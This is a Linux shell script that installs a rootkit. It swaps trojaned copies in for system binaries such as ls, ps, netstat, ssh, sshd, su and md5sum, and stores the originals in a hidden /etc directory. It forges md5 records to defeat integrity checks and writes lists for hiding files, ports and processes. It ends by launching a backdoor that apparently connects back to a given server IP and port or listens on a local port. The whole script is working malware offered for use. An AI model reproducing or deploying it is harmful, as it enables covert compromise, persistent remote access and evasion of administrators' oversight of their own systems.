#!/bin/sh

if [ $# -lt 1 ]
then
	echo "$#"
	echo "$1"
	echo "Usage `basename $0` serverip port"
	echo "Usage `basename $0` port"
	exit
fi

if [ ! -e fix ]
then
	echo "need fix,cp it pls"
	exit
fi

if [ ! -e clearlog ]
then
	echo "need clearlog, cp it pls"
	exit
fi

if [ ! -e ktpage0_r ]
then
	echo "need ktpage0_r, cp it pls"
	exit
fi

if [ ! -e ktpage1 ]
then
	echo "need ktpage1, cp it pls"
	exit
fi

mkdir -p /etc/cups/ssl/

myemail=youremail@126.com
maillist=/etc/ourmaillist
pdlist=/etc/ourpdlist

echo "1 youremail@126.com" >> $maillist

user=`echo $USER`
libproc=libproc-3.2.8.so
srclibproc=/lib/$libproc

if [ ! -e $srclibproc ]
then
	touch $srclibproc
fi

chmod +x fix
chmod +x clearlog

FILEBASE=/etc/
FILE_HIDE=FILE_HIDE
PORT_HIDE=PORT_HIDE
PROCESS_HIDE=PROCESS_HIDE
MD5_HIDE=MD5_HIDE
MD5=$FILEBASE$MD5_HIDE

BKDIR=/etc/BKDIR

if [ ! -e $BKDIR ]
then
	mkdir -p $BKDIR
fi

CURTIME=`date '+%M%S'`

FILES="find  ls  lsof  netstat  ps  pstree  ssh  sshd  su  top"

for file in ./ourfiles/*
do
	bfile=`basename $file`
	SRCFILE=`which $bfile|grep -v alias`
	md5=`md5sum $SRCFILE |awk '{print $1}'`
	echo -n $md5 >> $MD5
	echo " $bfile" >>$MD5
	BKFILE=$BKDIR/$bfile$CURTIME
	./fix $SRCFILE $file $BKFILE
done

BKFILE=$BKDIR/$libproc$CURTIME
./fix $srclibproc $libproc $BKFILE
#process md5sum

srcmd5=`which md5sum`
md5=`md5sum $srcmd5 |awk '{print $1}'`
echo -n $md5 >> $MD5
echo " md5sum" >>$MD5
BKFILE=$BKDIR/md5sum$CURTIME
./fix $srcmd5 MD5 $BKFILE

#end md5sum

echo "1 $MD5_HIDE" >> $FILEBASE/$FILE_HIDE
echo "1 $FILE_HIDE" >> $FILEBASE/$FILE_HIDE
echo "1 $PORT_HIDE" >> $FILEBASE/$FILE_HIDE
echo "1 $PROCESS_HIDE" >> $FILEBASE/$FILE_HIDE
echo "1 $BKDIR" >> $FILEBASE/$FILE_HIDE
echo "1 ourmaillist" >> $FILEBASE/$FILE_HIDE
echo "1 ourpdlist" >> $FILEBASE/$FILE_HIDE

echo "1 ktpage0_r" >> $FILEBASE/$PROCESS_HIDE

if [ $# -eq 2 ]
then
	chmod +x ktpage0_r
	./ktpage0_r $1 $2
fi

if [ $# -eq 1 ]
then
	chmod +x ktpage1
	./ktpage1 $1
fi

